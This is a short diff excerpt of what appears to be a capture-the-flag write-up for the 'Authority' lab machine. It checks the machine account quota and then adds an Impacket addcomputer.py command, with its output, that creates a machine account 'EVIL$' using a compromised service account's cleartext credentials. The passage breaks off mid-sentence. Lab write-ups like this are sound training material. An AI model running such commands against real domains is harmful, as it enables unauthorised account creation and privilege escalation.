@@ -526,5 +526,9 @@ MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
 The MAQ is set to 10 so i can make a computer acount
 
 ```python
+addcomputer.py -method LDAPS -computer-name 'EVIL$' -computer-pass 'Password123!' -dc-host authority.authority.htb 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Successfully added machine account EVIL$ with password Password123!.
 ```
+Now i have a machine account i can request a 
